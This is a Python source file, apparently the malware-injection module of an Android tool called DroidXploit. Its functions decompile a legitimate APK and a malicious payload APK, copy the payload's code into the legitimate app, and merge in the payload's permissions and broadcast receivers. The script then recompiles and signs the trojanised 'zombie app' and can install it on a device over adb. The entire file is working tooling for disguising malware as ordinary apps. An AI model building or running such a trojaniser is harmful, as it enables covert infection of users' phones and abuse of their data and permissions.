#!/usr/bin/python
import sys
sys.path.append("/home/deepal/android/workspace/DroidXploit")           #append directory to path so that this script can be run in terminal
sys.path.append("/home/deepal/git/droidXploit/DroidXploit")
import os, glob, signal, shutil
import subprocess
from resources.resources import *

#from resources.resources import *                                #this package is used to display text in colors
from collections import OrderedDict

subprocess.call("clear")                                                #clear terminal screen at the loading time
#commandList = ['inject','list','back']
commandList = OrderedDict([("?","Help page"),("help","Help page"),("list","List apks to inject and payloads"),("inject","Inject malware"),("back","Go back to dfconsole")])
print_good("Malware Injection Module Loaded")

def helpViewer():
    print "----------------"
    for key, value in commandList.items():
        print "\t",key,"\t\t",value


def displayAPKs(dirPath):                                               #display .apk files inside dirPath folder
    i = 1
    apks = []
    for item in glob.glob(dirPath+"/*.apk"):                             #check for files with .apk extension
        print "\t%s. %s" % (str(i), item.replace(dirPath+"/",""))  
        apks.append(item)     
        i += 1
    print ""
    return apks


def decompile(freshAPK, malAPK):                                        #decompile freshAPK file and malicious apk file
    freshAPKDec = "../temp/freshAPKDec"
    malAPKDec = "../temp/malAPKDec"
    
    if os.path.isdir(freshAPKDec):
        os.system("rm -r %s"%freshAPKDec)
        print_alert("Existing %s folder in temp directory deleted!"%freshAPKDec)           #remove any previously created folder with same name
    
    if os.path.isdir(malAPKDec):
        os.system("rm -r %s"%malAPKDec)
        print_alert("Existing %s folder in temp directory deleted!"%malAPKDec)             #remove any previously created folder with same name
    
    print_alert("Decompiling the original app...")
    
    cmd = "../tools/apktool d "+freshAPK+" "+freshAPKDec
    os.system(cmd)                                                                      #decompile fresh apk file
    print_good("%s app decompiled into %s folder"%(freshAPK, freshAPKDec))
    
    print_alert("Decompiling malware...")
    
    cmd = "../tools/apktool d "+malAPK+" "+malAPKDec
    os.system(cmd)                                                                      #decompile malicious apk file
    print_good("%s malware app decompiled into %s folder"%(malAPK, malAPKDec))
    
    return [freshAPKDec, malAPKDec]
    

def injectMalware(freshAPK, malAPK):
    [freshAPKDec, malAPKDec] = decompile(freshAPK, malAPK)                     # decompile fresh .apk file and malicious .apk files into temp folder
    injectFiles(freshAPKDec, malAPKDec)                                         #inject malicious code into the fresh apk
    updateManifest(freshAPKDec+"/AndroidManifest.xml", malAPKDec+"/AndroidManifest.xml")  # update permissions, services, receivers in new original AndroidManifest.xml file   
    return freshAPKDec

def injectFiles(freshAPKDec, malAPKDec):
    print_alert("Injecting files into original app...")    
    
    for item in os.listdir(malAPKDec+"/smali/com/"):                        #copy every packages inside malware file into original app
        if(os.path.isdir(malAPKDec+"/smali/com/"+item)):
            shutil.copytree(malAPKDec+"/smali/com/"+item, freshAPKDec+"/smali/com/"+item)
    
    print_done("All files injected into original app!")


def updateManifest(freshManifest, malManifest):
    
    print_alert("Injecting Permissions...")   
    freshMan = open(freshManifest, "r")                                 #open manifests for injection
    malMan = open(malManifest, "r")
    freshLines = freshMan.readlines()
    malLines = malMan.readlines()
    fcount = len(freshLines)
    
    activityIndex = []
    
    for i, fLine in enumerate(freshLines):
        if "<application" in fLine:                                         #identify where to inject permissions. before <application tag
            appStart = i;
        
    for mLine in malLines:
        if "<uses-permission" in mLine:  
            freshLines.append("0")                                          #add new list item to extend the list
            for j in range(fcount-1, appStart-1,-1):
                freshLines[j+1] = freshLines[j]
            freshLines[appStart] = mLine
            appStart += 1
            fcount+=1
    
    print_good("Permissions injected!")
    fcount = len(freshLines)                    #get the android manifest length

    print_alert("Injecting receiver and services...")
    
    receiverStart = 0
    receiverEnd = 0
    
    for i, fLine in enumerate(freshLines):
        if "<activity" in fLine:                        #find the start of <activity tag inside the original file's manifest
            activityIndex.append(i)

    for k, mLine in enumerate(malLines):                    #find any receiver entries inside the original file's manifest file
        receiverExists = False       
        if "<receiver" in mLine:
            receiverStart = k
        if "</receiver>" in mLine:
            receiverEnd = k
            receiverExists = True
                
        if receiverExists:
            for lineNo in range(receiverEnd, receiverStart-1, -1):
                freshLines.append("0")                              #add new line to extend the size of the manifest file
                for j in range(fcount-1, activityIndex[0]-1,-1):
                    freshLines[j+1] = freshLines[j]
                freshLines[activityIndex[0]] = malLines[lineNo]
                fcount += 1
        
    print_good("Receiver injected !")    

    freshMan.close()                        #close reading stream before opening file for writing
    
    freshMan = open(freshManifest, "w")     #open fresh manifest file for writing(inject permissions)
    for line in freshLines:
        freshMan.write(line)
    
    print_alert("Permissions injected into fresh AndroidManifest.xml. Closing manifests..")
    
    malMan.close()          #close AndroidManifest.xml file of Malware apk

    print_done("Done!") 

def recompile(decDir):
    print_alert("Recompiling decompiled app in %s..."%decDir)
    os.chdir("../tools")
    print os.getcwd()
    os.system("./apktool b -f %s %s"%(decDir, decDir.replace("Dec","_recom.apk")))      #recompile the infected apk file
    print_good("Zombie app("+decDir.replace("Dec","_recom.apk")+") created in the temp folder !")
    os.chdir("../injector")
    return decDir.replace("Dec","_recom.apk")

def signApp(compiledApp):
    print_alert("Signing the compiled app...")
    os.chdir("../tools")
    os.system("java -jar ../tools/signapk.jar testkey.x509.pem testkey.pk8 %s %s"%(compiledApp, compiledApp.replace(".apk","_signed.apk")))  #sign the recompiled apk file
    #print "[+] Zombie app signed ! Saved as "+ compiledApp.replace(".apk","_signed.apk")
    os.chdir("../injector")
    return compiledApp.replace(".apk","_signed.apk")
    
def installMalware(zombieAPK):
    success = False
    
    os.chdir("../tools")
    print "----------------------------------------------\n"
    
    os.system("./adb devices")                      # display available devices   
    print "----------------------------------------------"
    deviceName = raw_input("Enter device name : ")
    
    while not success:          #try to upload file again and again in case of failures
        print_alert("Installing "+zombieAPK+" ...")
        
        try:
            output = subprocess.check_output(['./adb','-s',deviceName,'install',zombieAPK])     #try to upload and install the zombie file
        except subprocess.CalledProcessError as err:
            print_error("No devices found ! Uploading skipped.")
            break
        else:    
            if "failure" in output.lower():     #check whether there are errors in uploading and installation
                print output
                print_error("Failed to upload and install package. ")
                retry = raw_input("Retry? (y/n) : ")
                if retry.lower() == "y":
                    continue
                else:
                    print_error("Zombie wasn't installed on "+deviceName+"!")
                    break
            else:
                print output
                success = True
                print_good("Zombie successfully installed on "+deviceName+" !")
            
    os.chdir("../injector")


def cleanTemp():
    option = (raw_input("\nDo you want to clean up temp directory ? (y/n) : ")).lower()
    if option == 'y':
        try:
            os.system("rm -R ../temp/*")        #clean all files inside the Temp folder
        except subprocess.CalledProcessError as err:
            print_error("Failed to empty temp folder !")
        else:
            print_good("temp files cleaned up!")


def checkDirExists(dirPath):
    if os.path.isdir(dirPath):   #check whether temp folder exists - when this framework is run for the first time, temp folder have to be created. it does not exist by default
        print_alert("%s directory already exists! Skipping folder creation.."%os.path.abspath(dirPath))
        return True
    else:
        print_alert("Creating %s directory..."%os.path.abspath(dirPath))
        try:
            os.mkdir(dirPath)  #create temp directory
        except subprocess.CalledProcessError as err:
            print_error("Could not create temp folder !")
        
        return False

def openTempDir():      #open temp directory to view files inside it
    
    if os.path.isdir("../temp"):
        try:
            os.system("nautilus ../temp")   #open temp directory in nautilus(ubuntu)
        except subprocess.CalledProcessError as err:
            print_error("Could not open temp folder !")
        finally:    
            raw_input("Press any key to continue...")
            
def injectnv():             ## non verbose inject mode
    print "\ncommand : \ninject [-o Open temp folder] [-c Clean temp folder before injection] \n[-i Install output file] <original app> \n<payload app> <ouput app>\n\n"
    command = ""
    while True:
        command = raw_input("inject > ")
        
        
        if command.lower() == "list":
            print "\nAvailable fresh apks to infect:-"
            displayAPKs("../apks")
            print "\nAvailable apk payloads to inject:-"
            displayAPKs("../app-payloads")
            continue
        
        elif command.lower() == "back":
            exit(0)
    
        elif command.lower() == "?" or command.lower() == "help":
            helpViewer()
            continue
            
        elif ((command.split(" "))[0]).lower() == "inject":    
            args = command.split(" ")
            params = args[1:]
            switches = []
            files = []
            for item in params:
                if "-" in item:
                    switches.append(item)
                else:
                    files.append(item)
              
            freshAPK = "../apks/"+files[0].replace(" ", "\ ")
            malAPK = "../app-payloads/"+files[1].replace(" ", "\ ")
            

            destAPK = files[2].replace(" ", "\ ")
              
            if "-c" in params:
                try:
                    os.system("rm -r ../temp/*")
                except subprocess.CalledProcessError as err:
                    print_error("Could not empty temp directory !")
                else:
                    print_good("temp directory emptied!")
                finally:
                    params.remove("-c")
          
            zombieAppDir = injectMalware(freshAPK, malAPK)  #inject malware files into original file
              
            zombieAppName = recompile(zombieAppDir)  #recompile the infected file
              
            zombieSignedAppName = signApp(zombieAppName)  #sign the zombie file
              
            os.rename(zombieSignedAppName, "../temp/"+destAPK)
            
            print_good("Zombie app signed and saved as "+"../temp/"+destAPK)
            
            if "-o" in params:
                openTempDir()
                params.remove("-o")
              
            if "-i" in params:
                installMalware(destAPK)
              
            print_done("Done!")
            continue
    
        elif command == "":
            continue
    
        else:
            print_error("Unknown command! type '?' or 'help' to list commands.")
            continue
    

def main():
    option = raw_input("Use verbose mode (y/n) : ")
    
    if option.lower()=="y":
        print "\nAvailable fresh apks to infect:-"
        displayAPKs("../apks")
        freshAPK = "../apks/" +(raw_input("Fresh APK file name to infect : ")).replace(" ", "\ ")              # select fresh input file to infect
        
        print "\nAvailable apk payloads to inject:-"
        displayAPKs("../app-payloads")
        payloadAPK = "../app-payloads/" + (raw_input("Payload APK file to inject : ")).replace(" ", "\ ")
        
        if checkDirExists("../temp"):                   #check whether temperory folder exists, otherwise create it. this folder includes decompiled apks
            cleanTemp()        
        
        zombieAppDir = injectMalware(freshAPK, payloadAPK)  #inject malware files into original file
        
        zombieAppName = recompile(zombieAppDir)  #recompile the infected file
        zombieSignedAppName = signApp(zombieAppName)  #sign the zombie file
        
        print_good("Zombie app signed and saved as "+zombieSignedAppName)
        
        option = raw_input("Do you want to open temp folder ? (y/n) : ")
        if option.lower() == "y":
            openTempDir()   #open temp directory
        
        print_good("\nMalware is ready to upload on a device. ")
        option = raw_input("Proceed with uploading? (y/n) : ")    
        if option.lower()=="y":
            installMalware(zombieSignedAppName)  #install malware on the device
    
    else:
        injectnv()
        
    print_done("All Done!")
    
if __name__ == "__main__":
    main()
